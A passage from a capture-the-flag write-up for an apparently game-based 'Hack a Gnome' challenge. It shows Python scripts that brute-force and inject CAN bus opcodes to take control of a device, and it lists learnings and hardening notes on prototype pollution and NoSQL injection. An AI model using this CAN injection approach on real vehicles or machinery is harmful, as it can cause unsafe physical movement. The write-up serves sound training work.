    <span class="p">(</span><span class="mh">0x300</span><span class="p">,</span> <span class="mh">0x3FF</span><span class="p">),</span>   <span class="c1"># statusBatteryVoltageID ... statusHeartbeatID</span>
<span class="p">]</span>

<span class="c1"># ==================================================</span>
<span class="c1"># COMMAND MAP (AUTO-SCANNED PER DIRECTION)</span>
<span class="c1"># Each direction will try ALL opcodes in the range</span>
<span class="c1"># ==================================================</span>
<span class="n">COMMAND_MAP</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s2">&quot;up&quot;</span><span class="p">:</span>    <span class="nb">list</span><span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="n">BRUTE_START_ID</span><span class="p">,</span> <span class="n">BRUTE_END_ID</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)),</span>
    <span class="s2">&quot;down&quot;</span><span class="p">:</span>  <span class="nb">list</span><span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="n">BRUTE_START_ID</span><span class="p">,</span> <span class="n">BRUTE_END_ID</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)),</span>
    <span class="s2">&quot;left&quot;</span><span class="p">:</span>  <span class="nb">list</span><span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="n">BRUTE_START_ID</span><span class="p">,</span> <span class="n">BRUTE_END_ID</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)),</span>
    <span class="s2">&quot;right&quot;</span><span class="p">:</span> <span class="nb">list</span><span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="n">BRUTE_START_ID</span><span class="p">,</span> <span class="n">BRUTE_END_ID</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)),</span>
<span class="p">}</span>

<span class="n">COMMAND_CHOICES</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">COMMAND_MAP</span><span class="o">.</span><span class="n">keys</span><span class="p">())</span> <span class="o">+</span> <span class="p">[</span><span class="s2">&quot;listen&quot;</span><span class="p">]</span>

<span class="n">IFACE_NAME</span> <span class="o">=</span> <span class="s2">&quot;gcan0&quot;</span>

<span class="c1"># ==================================================</span>
<span class="c1"># HELPER: CHECK IF CAN ID IS IN A SKIP RANGE</span>
<span class="c1"># ==================================================</span>
<span class="k">def</span><span class="w"> </span><span class="nf">in_skip_ranges</span><span class="p">(</span><span class="n">can_id</span><span class="p">:</span> <span class="nb">int</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">bool</span><span class="p">:</span>
    <span class="k">for</span> <span class="n">start</span><span class="p">,</span> <span class="n">end</span> <span class="ow">in</span> <span class="n">SKIP_RANGES</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">start</span> <span class="o">&lt;=</span> <span class="n">can_id</span> <span class="o">&lt;=</span> <span class="n">end</span><span class="p">:</span>
            <span class="k">return</span> <span class="kc">True</span>
    <span class="k">return</span> <span class="kc">False</span>

<span class="c1"># ==================================================</span>
<span class="c1"># SEND SINGLE OPCODE (EMPTY PAYLOAD – ORIGINAL MODE)</span>
<span class="c1"># ==================================================</span>
<span class="k">def</span><span class="w"> </span><span class="nf">send_opcode</span><span class="p">(</span><span class="n">bus</span><span class="p">,</span> <span class="n">command_id</span><span class="p">):</span>
    <span class="n">message</span> <span class="o">=</span> <span class="n">can</span><span class="o">.</span><span class="n">Message</span><span class="p">(</span>
        <span class="n">arbitration_id</span><span class="o">=</span><span class="n">command_id</span><span class="p">,</span>
        <span class="n">data</span><span class="o">=</span><span class="p">[],</span>                
        <span class="n">is_extended_id</span><span class="o">=</span><span class="kc">False</span>
    <span class="p">)</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">bus</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">message</span><span class="p">)</span>
        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Sent opcode: 0x</span><span class="si">{</span><span class="n">command_id</span><span class="si">:</span><span class="s2">X</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
    <span class="k">except</span> <span class="n">can</span><span class="o">.</span><span class="n">CanError</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Error sending message: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>

<span class="c1"># ==================================================</span>
<span class="c1"># AUTO-BRUTE FORCE FOR A GIVEN DIRECTION</span>
<span class="c1"># ==================================================</span>
<span class="k">def</span><span class="w"> </span><span class="nf">send_command</span><span class="p">(</span><span class="n">bus</span><span class="p">,</span> <span class="n">command_name</span><span class="p">):</span>
    <span class="n">opcode_list</span> <span class="o">=</span> <span class="n">COMMAND_MAP</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">command_name</span><span class="p">)</span>

    <span class="k">if</span> <span class="ow">not</span> <span class="n">opcode_list</span><span class="p">:</span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;No opcodes defined for this command.&quot;</span><span class="p">)</span>
        <span class="k">return</span>

    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">=== AUTO-BRUTE &#39;</span><span class="si">{</span><span class="n">command_name</span><span class="o">.</span><span class="n">upper</span><span class="p">()</span><span class="si">}</span><span class="s2">&#39; ===&quot;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Scanning 0x</span><span class="si">{</span><span class="n">BRUTE_START_ID</span><span class="si">:</span><span class="s2">X</span><span class="si">}</span><span class="s2"> → 0x</span><span class="si">{</span><span class="n">BRUTE_END_ID</span><span class="si">:</span><span class="s2">X</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Skipping known telemetry ranges (0x300–0x3FF)&quot;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Press CTRL+C immediately when motion is observed.</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>

    <span class="k">try</span><span class="p">:</span>
        <span class="k">for</span> <span class="n">opcode</span> <span class="ow">in</span> <span class="n">opcode_list</span><span class="p">:</span>
            <span class="k">if</span> <span class="n">in_skip_ranges</span><span class="p">(</span><span class="n">opcode</span><span class="p">):</span>
                <span class="k">continue</span>

            <span class="n">send_opcode</span><span class="p">(</span><span class="n">bus</span><span class="p">,</span> <span class="n">opcode</span><span class="p">)</span>
            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.25</span><span class="p">)</span>  

    <span class="k">except</span> <span class="ne">KeyboardInterrupt</span><span class="p">:</span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2"> Motion detected (user interrupted).&quot;</span><span class="p">)</span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;The LAST opcode printed above is the REAL command for this direction.&quot;</span><span class="p">)</span>

<span class="c1"># ==================================================</span>
<span class="c1"># LISTEN MODE (UNCHANGED)</span>
<span class="c1"># ==================================================</span>
<span class="k">def</span><span class="w"> </span><span class="nf">listen_for_messages</span><span class="p">(</span><span class="n">bus</span><span class="p">):</span>
    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Listening for messages on </span><span class="si">{</span><span class="n">bus</span><span class="o">.</span><span class="n">channel_info</span><span class="si">}</span><span class="s2">. Press Ctrl+C to stop.&quot;</span><span class="p">)</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="k">for</span> <span class="n">msg</span> <span class="ow">in</span> <span class="n">bus</span><span class="p">:</span>
            <span class="n">timestamp</span> <span class="o">=</span> <span class="n">datetime</span><span class="o">.</span><span class="n">datetime</span><span class="o">.</span><span class="n">now</span><span class="p">()</span><span class="o">.</span><span class="n">strftime</span><span class="p">(</span>
                <span class="s1">&#39;%Y-%m-</span><span class="si">%d</span><span class="s1"> %H:%M:%S.</span><span class="si">%f</span><span class="s1">&#39;</span>
            <span class="p">)[:</span><span class="o">-</span><span class="mi">3</span><span class="p">]</span>
            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">timestamp</span><span class="si">}</span><span class="s2"> | Received: </span><span class="si">{</span><span class="n">msg</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>

    <span class="k">except</span> <span class="ne">KeyboardInterrupt</span><span class="p">:</span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">Stopping listener...&quot;</span><span class="p">)</span>
    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">An error occurred during listening: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>

<span class="c1"># ==================================================</span>
<span class="c1"># MAIN</span>
<span class="c1"># ==================================================</span>
<span class="k">def</span><span class="w"> </span><span class="nf">main</span><span class="p">():</span>
    <span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="o">.</span><span class="n">ArgumentParser</span><span class="p">(</span>
        <span class="n">description</span><span class="o">=</span><span class="s2">&quot;Send CAN commands, auto-bruteforce movement opcodes, or listen.&quot;</span>
    <span class="p">)</span>
    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span>
        <span class="s2">&quot;command&quot;</span><span class="p">,</span>
        <span class="n">choices</span><span class="o">=</span><span class="n">COMMAND_CHOICES</span><span class="p">,</span>
        <span class="n">help</span><span class="o">=</span><span class="sa">f</span><span class="s2">&quot;The command to send (</span><span class="si">{</span><span class="s1">&#39;, &#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">COMMAND_MAP</span><span class="o">.</span><span class="n">keys</span><span class="p">())</span><span class="si">}</span><span class="s2">) or &#39;listen&#39;.&quot;</span>
    <span class="p">)</span>
    <span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="o">.</span><span class="n">parse_args</span><span class="p">()</span>

    <span class="k">try</span><span class="p">:</span>
        <span class="n">bus</span> <span class="o">=</span> <span class="n">can</span><span class="o">.</span><span class="n">interface</span><span class="o">.</span><span class="n">Bus</span><span class="p">(</span>
            <span class="n">channel</span><span class="o">=</span><span class="n">IFACE_NAME</span><span class="p">,</span>
            <span class="n">interface</span><span class="o">=</span><span class="s1">&#39;socketcan&#39;</span><span class="p">,</span>
            <span class="n">receive_own_messages</span><span class="o">=</span><span class="kc">False</span>
        <span class="p">)</span>
        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Successfully connected to </span><span class="si">{</span><span class="n">IFACE_NAME</span><span class="si">}</span><span class="s2">.&quot;</span><span class="p">)</span>
    <span class="k">except</span> <span class="ne">OSError</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Error connecting to CAN interface </span><span class="si">{</span><span class="n">IFACE_NAME</span><span class="si">}</span><span class="s2">: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Make sure the </span><span class="si">{</span><span class="n">IFACE_NAME</span><span class="si">}</span><span class="s2"> interface is up:&quot;</span><span class="p">)</span>
        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;  sudo ip link set up </span><span class="si">{</span><span class="n">IFACE_NAME</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Unexpected error during bus initialization: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

    <span class="c1"># =========================</span>
    <span class="c1"># MODE SELECTION</span>
    <span class="c1"># =========================</span>
    <span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">command</span> <span class="o">==</span> <span class="s2">&quot;listen&quot;</span><span class="p">:</span>
        <span class="n">listen_for_messages</span><span class="p">(</span><span class="n">bus</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">send_command</span><span class="p">(</span><span class="n">bus</span><span class="p">,</span> <span class="n">args</span><span class="o">.</span><span class="n">command</span><span class="p">)</span>

    <span class="n">bus</span><span class="o">.</span><span class="n">shutdown</span><span class="p">()</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;CAN bus connection closed.&quot;</span><span class="p">)</span>

<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
    <span class="n">main</span><span class="p">()</span>
</code></pre></div></td></tr></table></div>
</details>
<p>We try with below map and the gnome moves in all directions. <br/>
<div class="highlight"><pre><span></span><code>&quot;up&quot;: 0x201,
&quot;down&quot;: 0x202,
&quot;left&quot;: 0x203,
&quot;right&quot;: 0x204,
</code></pre></div></p>
<details>
<summary>Python script - canbus_client.py with specific and working command map</summary>
<div class="highlight"><pre><span></span><code>#!/usr/bin/python3
import can
import time
import argparse
import sys
import datetime # To show timestamps for received messages

# Define CAN IDs (I think these are wrong with newest update, we need to check the actual device documentation)
COMMAND_MAP = {
    &quot;up&quot;: 0x201,
    &quot;down&quot;: 0x202,
    &quot;left&quot;: 0x203,
    &quot;right&quot;: 0x204,
    # Add other command IDs if needed
}
# Add &#39;listen&#39; as a special command option
COMMAND_CHOICES = list(COMMAND_MAP.keys()) + [&quot;listen&quot;]

IFACE_NAME = &quot;gcan0&quot;

def send_command(bus, command_id):
    &quot;&quot;&quot;Sends a CAN message with the given command ID.&quot;&quot;&quot;
    message = can.Message(
        arbitration_id=command_id,
        data=[], # No specific data needed for these simple commands
        is_extended_id=False
    )
    try:
        bus.send(message)
        print(f&quot;Sent command: ID=0x{command_id:X}&quot;)
    except can.CanError as e:
        print(f&quot;Error sending message: {e}&quot;)

def listen_for_messages(bus):
    &quot;&quot;&quot;Listens for CAN messages and prints them.&quot;&quot;&quot;
    print(f&quot;Listening for messages on {bus.channel_info}. Press Ctrl+C to stop.&quot;)
    try:
        # Iterate indefinitely over messages received on the bus
        for msg in bus:
            # Get current time for the timestamp
            timestamp = datetime.datetime.now().strftime(&#39;%Y-%m-%d %H:%M:%S.%f&#39;)[:-3] # Milliseconds precision
            print(f&quot;{timestamp} | Received: {msg}&quot;)
            # You could add logic here to filter or react to specific messages
            # if msg.arbitration_id == 0x100:
            #    print(&quot;  (Noise message)&quot;)

    except KeyboardInterrupt:
        print(&quot;\nStopping listener...&quot;)
    except Exception as e:
        print(f&quot;\nAn error occurred during listening: {e}&quot;)

def main():
    parser = argparse.ArgumentParser(description=&quot;Send CAN bus commands or listen for messages.&quot;)
    parser.add_argument(
        &quot;command&quot;,
        choices=COMMAND_CHOICES,
        help=f&quot;The command to send ({&#39;, &#39;.join(COMMAND_MAP.keys())}) or &#39;listen&#39; to monitor the bus.&quot;
    )
    args = parser.parse_args()

    try:
        # Initialize the CAN bus interface
        bus = can.interface.Bus(channel=IFACE_NAME, interface=&#39;socketcan&#39;, receive_own_messages=False) # Set receive_own_messages if needed
        print(f&quot;Successfully connected to {IFACE_NAME}.&quot;)
    except OSError as e:
        print(f&quot;Error connecting to CAN interface {IFACE_NAME}: {e}&quot;)
        print(f&quot;Make sure the {IFACE_NAME} interface is up (&#39;sudo ip link set up {IFACE_NAME}&#39;)&quot;)
        print(&quot;And that you have the necessary permissions.&quot;)
        sys.exit(1)
    except Exception as e:
        print(f&quot;An unexpected error occurred during bus initialization: {e}&quot;)
        sys.exit(1)

    if args.command == &quot;listen&quot;:
        listen_for_messages(bus)
    else:
        command_id = COMMAND_MAP.get(args.command)
        if command_id is None: # Should not happen due to choices constraint
            print(f&quot;Invalid command for sending: {args.command}&quot;)
            bus.shutdown()
            sys.exit(1)
        send_command(bus, command_id)
        # Give a moment for the message to be potentially processed if listening elsewhere
        time.sleep(0.1)

    # Shutdown the bus connection cleanly
    bus.shutdown()
    print(&quot;CAN bus connection closed.&quot;)

if __name__ == &quot;__main__&quot;:
    main()
</code></pre></div>
</details>
<p>The gnome moves now. <br/>
We can move it to rach the lever on the top left to complete the challenge.
<img alt="Hack-a-genome" src="../../img/objectives/Hack_a_Gnome/Hack_a_Gnome_29.png" /></p>
<div class="admonition success">
<p class="admonition-title">Answer</p>
</div>
<p>Completed in the game.</p>
<h2 id="response">Response<a class="headerlink" href="#response" title="Permanent link">⚓︎</a></h2>
<div class="admonition quote">
<p class="admonition-title">Chris Davis</p>
<p>Excellent work! You've successfully taken control of the gnome - look at that interface responding to our commands now.<br/>
Time to turn this little rebel against its own manufacturing operation and shut them down for good!</p>
</div>
<h2 id="learnings">Learnings<a class="headerlink" href="#learnings" title="Permanent link">⚓︎</a></h2>
<ol>
<li>I first learnt about <strong>prototype pollution</strong> in this challenge. Very nice experience!
When combined with template rendering, It can get us the RCE on the server like It did with /stats page.</li>
<li>Don't assume the backend database is an RDBMS like SQL server :-). It could also be a NoSQL database and there are ways to determine the field names (e.g. using IS_DEFINED).</li>
</ol>
<h2 id="prevention-hardening-notes">Prevention &amp; Hardening Notes<a class="headerlink" href="#prevention-hardening-notes" title="Permanent link">⚓︎</a></h2>
<ol>
<li>Explicitly block prototype keys (<code>__proto__</code>, <code>constructor</code>, <code>prototype</code>) from all update paths.</li>
<li>Never allow user input to influence NoSQL query structure. Operators like <code>$ne</code> and functions like <code>IS_DEFINED</code> should never be reachable from user-controlled data.</li>
<li>Password was MD5 hashed. Use slow, salted password hashing (bcrypt/argon2).</li>
</ol>







  
  






                
              </article>
            </div>
          
          
<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
        </div>
        
      </main>
      
        <footer class="md-footer">
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
  
    Made with
    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
      Material for MkDocs
    </a>
  
</div>
      
        
<div class="md-social">
  
    
    
    
    
    <a href="https://twitter.com/<twitter_username>" target="_blank" rel="noopener" title="Twitter" class="md-social__link">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M459.4 151.7c.3 4.5.3 9.1.3 13.6 0 138.7-105.6 298.6-298.6 298.6-59.5 0-114.7-17.2-161.1-47.1 8.4 1 16.6 1.3 25.3 1.3 49.1 0 94.2-16.6 130.3-44.8-46.1-1-84.8-31.2-98.1-72.8 6.5 1 13 1.6 19.8 1.6 9.4 0 18.8-1.3 27.6-3.6-48.1-9.7-84.1-52-84.1-103v-1.3c14 7.8 30.2 12.7 47.4 13.3-28.3-18.8-46.8-51-46.8-87.4 0-19.5 5.2-37.4 14.3-53C87.4 130.8 165 172.4 252.1 176.9c-1.6-7.8-2.6-15.9-2.6-24C249.5 95.1 296.3 48 354.4 48c30.2 0 57.5 12.7 76.7 33.1 23.7-4.5 46.5-13.3 66.6-25.3-7.8 24.4-24.4 44.8-46.1 57.8 21.1-2.3 41.6-8.1 60.4-16.2-14.3 20.8-32.2 39.3-52.6 54.3"/></svg>
    </a>
  
    
    
    
    
    <a href="https://github.com/<github_username>" target="_blank" rel="noopener" title="GitHub" class="md-social__link">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
    </a>
  
    
    
    
    
    <a href="https://www.instagram.com/<instagram_username>" target="_blank" rel="noopener" title="Instagram" class="md-social__link">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M224.3 141a115 115 0 1 0-.6 230 115 115 0 1 0 .6-230m-.6 40.4a74.6 74.6 0 1 1 .6 149.2 74.6 74.6 0 1 1-.6-149.2m93.4-45.1a26.8 26.8 0 1 1 53.6 0 26.8 26.8 0 1 1-53.6 0m129.7 27.2c-1.7-35.9-9.9-67.7-36.2-93.9-26.2-26.2-58-34.4-93.9-36.2-37-2.1-147.9-2.1-184.9 0-35.8 1.7-67.6 9.9-93.9 36.1s-34.4 58-36.2 93.9c-2.1 37-2.1 147.9 0 184.9 1.7 35.9 9.9 67.7 36.2 93.9s58 34.4 93.9 36.2c37 2.1 147.9 2.1 184.9 0 35.9-1.7 67.7-9.9 93.9-36.2 26.2-26.2 34.4-58 36.2-93.9 2.1-37 2.1-147.8 0-184.8M399 388c-7.8 19.6-22.9 34.7-42.6 42.6-29.5 11.7-99.5 9-132.1 9s-102.7 2.6-132.1-9c-19.6-7.8-34.7-22.9-42.6-42.6-11.7-29.5-9-99.5-9-132.1s-2.6-102.7 9-132.1c7.8-19.6 22.9-34.7 42.6-42.6 29.5-11.7 99.5-9 132.1-9s102.7-2.6 132.1 9c19.6 7.8 34.7 22.9 42.6 42.6 11.7 29.5 9 99.5 9 132.1s2.7 102.7-9 132.1"/></svg>
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    
    
    
      
      <script id="__config" type="application/json">{"base": "../..", "features": ["toc.integrate", "content.code.copy", "navigation.sections"], "search": "../../assets/javascripts/workers/search.973d3a69.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
    
    
      <script src="../../assets/javascripts/bundle.f55a23d4.min.js"></script>
      
        <script src="https://cdnjs.cloudflare.com/ajax/libs/tablesort/5.2.1/tablesort.min.js"></script>
      
        <script src="../../js/tablesort.js"></script>
      
    
  </body>
</html>